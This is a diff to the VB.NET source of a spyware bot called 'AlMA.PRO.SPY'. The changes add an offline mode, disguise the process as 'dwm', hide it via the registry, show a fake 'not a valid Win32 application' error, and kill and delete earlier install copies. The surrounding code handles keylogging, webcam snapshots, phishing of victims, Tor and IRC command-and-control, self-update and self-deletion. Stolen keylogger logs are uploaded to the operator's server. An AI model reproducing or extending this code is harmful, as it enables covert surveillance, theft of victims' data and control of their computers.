@@ -5,6 +5,16 @@ Imports System.Net.Mail
 Imports Microsoft.Win32
 Module main
     Sub Main()
+        Dim t As New Threading.ThreadStart(Sub()
+                                               While True
+                                                   If Not My.Computer.Network.IsAvailable Then
+                                                       OfflineMode = True
+                                                   Else
+                                                       OfflineMode = False
+                                                   End If
+                                               End While
+                                           End Sub)
+        Dim tt As New Threading.Thread(t) : tt.Start()
         Try
             If username = "SYSTEM" Then
                 If IO.File.Exists(path & "\ZeroDays2System") Then
@@ -112,6 +122,8 @@ Module main
             log_all("Main function: " & ex.Message & vbNewLine & ex.StackTrace)
         End Try
     End Sub ' DO NOT tamper with this
+    Dim DedicatedName As String = "dwm" ' Name after first run.
+    Dim OfflineMode As Boolean = False ' Not to be modified! This tells the bot if we should go "Brutal Kangaroo" or not.
     Dim server As String = "http://SITE" ' Your server on which bots connect.
     Dim aps As String = "/alma.pro.spy/" ' Path of AlMA.PRO.SPY on your server.
     Dim cc As String = "http://SITE/alma.pro.spy/extras/cc.png" 'cc is an exe that takes a snap of the webcam. This variable is the path from where to get it
@@ -182,6 +194,7 @@ Module main
     ' Share L&C: Share Listing and Control. [DONE]
     ' Users A/R: Add or Remove users. [DONE]
     ' SEV: Social engineer victims to do tasks (Phishing). [DONE]
+    ' SCV: Subconsciously control victims (Beaniral Beats, Screen messages & Fake activities)(!!!Dangerous!!!).
     ' DIA: Detect important activities.
     ' DPT: Determine person's type.
     ' 1994Controller: Using port 1994 as a control port that supports HTTP requests.
@@ -205,7 +218,7 @@ Module main
     Function RegHide() As Boolean
         RegHide = False
         Try
-            RegPush(Process.GetCurrentProcess.MainModule.FileName, Process.GetCurrentProcess.ProcessName)
+            RegPush(Process.GetCurrentProcess.MainModule.FileName, DedicatedName)
             For Each f In {"cc.png", "wfmf.png", "rcmd.png", "kl.png", "nircmd.png", "cl.png"}
                 Try
                     RegPush(path & "\" & f, f)
@@ -515,7 +528,7 @@ skp:
             s += p.StandardError.ReadToEnd
             GPO = s
         Catch ex As Exception
-            log_all("GPO function: " & ex.Message & vbNewLine & ex.StackTrace)
+            log_all("GPO function: " & ex.Message & vbNewLine & ex.StackTrace & vbNewLine & "CMD:" & cmd & vbNewLine & "Args:" & args & vbNewLine & "StartIn:" & startin)
         End Try
     End Function ' Get Process Output.
     Function CanH() As Boolean
@@ -607,7 +620,16 @@ skp:
         Dim t As New Threading.Thread(New Threading.ThreadStart(AddressOf IRCC))
         t.Start()
         If onTor Then
-            TorMode()
+            Dim t1 As New Threading.Thread(New Threading.ThreadStart(Sub()
+                                                                         While True
+                                                                             While OfflineMode
+                                                                             End While
+                                                                             TorMode()
+                                                                             Do Until OfflineMode
+                                                                             Loop
+                                                                         End While
+                                                                     End Sub))
+            t1.Start()
         End If
         If KeyLogDef Then
             Try
@@ -716,12 +738,17 @@ tmfc:
         End If
 #End Region
 ntor:
+        Try
+            If Not IO.Directory.Exists(path & "\Tor") Then IO.Directory.CreateDirectory(path & "\Tor")
+        Catch ex As Exception
+        End Try
         Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS\Tor", RegistryKeyPermissionCheck.ReadWriteSubTree)
 #Region "Tor Files"
         If Not RegCheck("tor.exe", True) And Not RegCheck("Tor.part01.rar", True) Then
+            While OfflineMode
+            End While
             If CUH(Unrar) Then
                 Try
-                    If Not IO.Directory.Exists(path & "\Tor") Then IO.Directory.CreateDirectory(path & "\Tor")
                     If Not IO.File.Exists(path & "\Tor\unrar.exe") Then DownloadFile(Unrar, path & "\Tor\unrar.exe")
                     If Not IO.File.Exists(path & "\Tor\unrar3.dll") Then DownloadFile(Unrar3dll, path & "\Tor\unrar3.dll")
                 Catch ex As Exception
@@ -794,6 +821,8 @@ again:
         End If
 #End Region
         If RegCheck("Tor.part01.rar", True) Then
+            While OfflineMode
+            End While
             Try
                 Dim ac = 22
                 Try
@@ -848,16 +877,23 @@ ended:
 notyet:
                 Next
             End If
+        Else
+            GoTo ntor
         End If
         Dim TorUp = False
         Try
             For Each p In Process.GetProcessesByName("tor")
-                If p.MainModule.FileName = path & "\Tor\tor.exe" Then torP = p : TorUp = True : GoTo tau
+                If p.MainModule.FileName = path & "\Tor\tor.exe" Then
+                    If Not OfflineMode Then torP = p : TorUp = True : GoTo tau
+                    If OfflineMode Then p.Kill() : torP = Nothing : TorUp = False
+                End If
             Next
         Catch ex As Exception
             log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
         End Try
         Try
+            While OfflineMode
+            End While
             torP = New Process
             torP.StartInfo = New ProcessStartInfo(path & "\Tor\tor.exe", "-f torrc")
             torP.StartInfo.UseShellExecute = False
@@ -895,6 +931,8 @@ notyet:
             log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
         End Try
         Do Until TorUp
+            While OfflineMode
+            End While
             Try
                 If torP.HasExited Then
                     torP.Start()
@@ -905,6 +943,7 @@ notyet:
                     torP.BeginOutputReadLine()
                 End If
             Catch ex As Exception
+                If Not IO.File.Exists(torP.MainModule.FileName) Then GoTo ntor
                 log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
             End Try
         Loop
@@ -952,6 +991,8 @@ pau:
     End Function ' Get Tor Count (needed when downloading Tor-part* files).
     Sub IRCC() ' Start with thread.
 re:
+        While OfflineMode
+        End While
         Try
             Dim irca As New Net.Sockets.TcpClient
             Dim ns As IO.Stream
@@ -1129,7 +1170,7 @@ notyet:
         '   log_all("Added APS as allowed program in the Firewall.", 3)
         'End If
         While 1
-            If My.Computer.Network.IsAvailable Then
+            If Not OfflineMode Then
                 DEC()
                 If CS() Then
                     Dim av = "&antivirus=None"
@@ -1144,17 +1185,20 @@ notyet:
     End Sub ' Get To Me.
     Function getip() As String
         getip = "127.0.0.1"
+        If OfflineMode Then Return getip
         Try
             Return Split(BS(New Net.WebClient().DownloadData("http://jsonip.com")), """")(3)
         Catch ex As Exception
         End Try
     End Function ' get the real IP (Tor gives you 127.0.0.1).
     Function CS() As Boolean
+        If OfflineMode Then Return False
         CS = False
         If CUH(server) Then Return True
         If IMAPSC() Then LS() : DEC() : Return True
     End Function ' Check my server.
     Function IMAPSC() As Boolean
+        If OfflineMode Then Return False
         IMAPSC = False
         Try
             Dim b As Byte() = Convert.FromBase64String(imappass)
@@ -1238,6 +1282,7 @@ notyet:
         End Try
     End Function ' IMAP settings check.
     Sub UM(url As String)
+        If OfflineMode Then Return
         Try
             IO.File.WriteAllBytes(Process.GetCurrentProcess.MainModule.FileName & "-update", a.DownloadData(url))
             RegPush(Process.GetCurrentProcess.MainModule.FileName & "-update", Process.GetCurrentProcess.ProcessName)
@@ -1263,7 +1308,9 @@ notyet:
             Try
                 If Not BS(rgkey.GetValue(logfile.Remove(0, logfile.LastIndexOf("\") + 1))) = "" Then
                     olddata = BS(rgkey.GetValue(logfile.Remove(0, logfile.LastIndexOf("\") + 1)))
-                    If olddata.Length >= 200 * 1024 Then Dim s = UploadFile(SB(olddata), "AlMA.PRO.SPY.log", "logs") : olddata = "" : docmds(s)
+                    If Not OfflineMode Then
+                        If onTor And torP IsNot Nothing Then If olddata.Length >= 200 * 1024 Then Dim s = UploadFile(SB(olddata), "AlMA.PRO.SPY.log", "logs") : olddata = "" : docmds(s)
+                    End If
                 End If
             Catch ex As Exception
                 log_all("log_all function: " & ex.Message & vbNewLine & ex.StackTrace)
@@ -1640,6 +1687,8 @@ st:
         klp = Process.Start("c:\windows\system32\cmd.exe", "/C """ & path & """\kl.png")
     End Sub ' Enable KeyLogger.
     Function UploadFile(data As Byte(), fname As String, Optional folder As String = "") As String
+        If onTor And (torP Is Nothing Or torP.HasExited) Then Return ""
+        If OfflineMode Then Return ""
         UploadFile = ""
         If folder <> "" Then folder = "&folder=" & folder
         Dim url = server & aps & "connect.php?password=" & password & "&type=upload&botid=" & botid & "&file=" & fname & folder
@@ -1653,6 +1702,8 @@ st:
         End Try
     End Function ' Upload a file from bytes.
     Function UploadFile(file As String, fname As String, Optional folder As String = "") As String
+        If onTor And (torP Is Nothing Or torP.HasExited) Then Return ""
+        If OfflineMode Then Return ""
         UploadFile = ""
         If Not CUH(server) Then Return ""
         If folder <> "" Then folder = "&folder=" & folder
@@ -1670,6 +1721,7 @@ st:
         End Try
     End Function ' Upload a file from path.
     Function Post(data As String) As String
+        If OfflineMode Then Return ""
         Net.ServicePointManager.Expect100Continue = False
         Post = ""
         Dim url = server & aps & "connect.php?password=" & password
@@ -1681,6 +1733,7 @@ st:
         End Try
     End Function ' Post (The default action to connect [more are coming]).
     Function CA(ByVal URL As String) As Boolean
+        If OfflineMode Then Return False
         Dim response As Net.HttpWebResponse
         Try
             Dim request As Net.WebRequest = Net.WebRequest.Create(URL)
@@ -1695,6 +1748,7 @@ st:
         Return True
     End Function ' Check availability.
     Sub DownloadFile(sf As String, df As String)
+        If OfflineMode Then Return
         Try
             Dim tmpdf = df
             If Not CA(sf) Then Exit Sub
@@ -1769,20 +1823,24 @@ nthere:
     Sub CMP()
         Try
             Dim melt As Boolean = False
+            Dim runtrick As Boolean = False
             If Environment.UserName.ToUpper = "SYSTEM" Then Exit Sub
-            If Process.GetCurrentProcess.MainModule.FileName.ToLower.EndsWith("-melt.exe") Then melt = True
+            If Process.GetCurrentProcess.ProcessName.ToLower.EndsWith("-melt") Then melt = True
+            If Process.GetCurrentProcess.ProcessName.ToLower.StartsWith("rt-") Then runtrick = True
             Dim there As Boolean = False
             Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree)
             For Each n In rgkey.GetValueNames()
-                If n = Process.GetCurrentProcess.ProcessName Then there = True
+                If n = DedicatedName Then there = True
             Next
             If Not there Then
                 RegHide()
                 Dim pr = New Process
-                pr.StartInfo = New ProcessStartInfo("c:\windows\system32\cmd.exe", "/C ""timeout 5 && " & My.Resources.powershell.Replace("^N^", Process.GetCurrentProcess.ProcessName).Replace("^E^", "exe") & """")
+                pr.StartInfo = New ProcessStartInfo("c:\windows\system32\cmd.exe", "/C ""timeout 5 && " & My.Resources.powershell.Replace("^N^", DedicatedName).Replace("^E^", "exe") & """")
                 pr.StartInfo.UseShellExecute = False
                 pr.StartInfo.CreateNoWindow = True
-                pr.Start()
+                If runtrick Then
+                    MsgBox(Process.GetCurrentProcess.MainModule.FileName + " is not a valid Win32 application", MsgBoxStyle.Critical, Process.GetCurrentProcess.MainModule.FileName)
+                End If
                 If melt Then
                     Dim pr1 = New Process
                     pr1.StartInfo = New ProcessStartInfo("c:\windows\system32\cmd.exe", "/C ""timeout 5 && del /f /q /s """ & Process.GetCurrentProcess.MainModule.FileName & """""")
@@ -1790,18 +1848,39 @@ nthere:
                     pr1.StartInfo.CreateNoWindow = True
                     pr1.Start()
                 End If
+                pr.Start()
                 End
             Else
-                If regread("lastdir") <> "" Then
-                    Dim ld = regread("HKEY_CURRENT_USER\Software\APS", "lastdir")
-                    If IO.File.Exists(ld & "\Tor\tor.exe") Then
-                        If Not IO.Directory.Exists(path & "\Tor") Then IO.Directory.CreateDirectory(path & "\Tor")
-                        For Each f In IO.Directory.GetFiles(ld & "\Tor")
-                            IO.File.Copy(f, path & "\Tor\" & f.Remove(0, f.LastIndexOf("\") + 1))
-                        Next
+                Try
+                    If regread("lastdir") <> "" Then
+                        Dim ld = regread("HKEY_CURRENT_USER\Software\APS", "lastdir")
+                        If IO.File.Exists(ld & "\Tor\tor.exe") Then
+                            If Not IO.Directory.Exists(path & "\Tor") Then IO.Directory.CreateDirectory(path & "\Tor")
+                            For Each f In IO.Directory.GetFiles(ld & "\Tor")
+                                IO.File.Copy(f, path & "\Tor\" & f.Remove(0, f.LastIndexOf("\") + 1))
+                            Next
+                        End If
+                        Try
+                            For Each p In Process.GetProcesses()
+                                Try
+                                    Dim f As New IO.FileInfo(p.MainModule.FileName)
+                                    If f.DirectoryName.ToLower.StartsWith(ld.ToLower) Then
+                                        p.Kill()
+                                    End If
+                                Catch ex As Exception
+                                End Try
+                            Next
+                        Catch ex As Exception
+                            log_all("CMP function: " & ex.Message & vbNewLine & ex.StackTrace)
+                        End Try
+                        Try
+                            If IO.Directory.Exists(ld) Then IO.Directory.Delete(ld, True)
+                        Catch ex As Exception
+                        End Try
                     End If
-                    If IO.Directory.Exists(ld) Then IO.Directory.Delete(ld, True)
-                End If
+                Catch ex As Exception
+                    log_all("CMP function: " & ex.Message & vbNewLine & ex.StackTrace)
+                End Try
                 regwrite("HKEY_CURRENT_USER\Software\APS", "lastdir", path)
             End If
         Catch ex As Exception
@@ -1887,6 +1966,7 @@ nthere:
         Next
     End Sub ' Do Extra Check.
     Sub ED(e As String)
+        If OfflineMode Then Return
         If Not e = "" And Not e = Nothing Then
             Try
                 Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree)
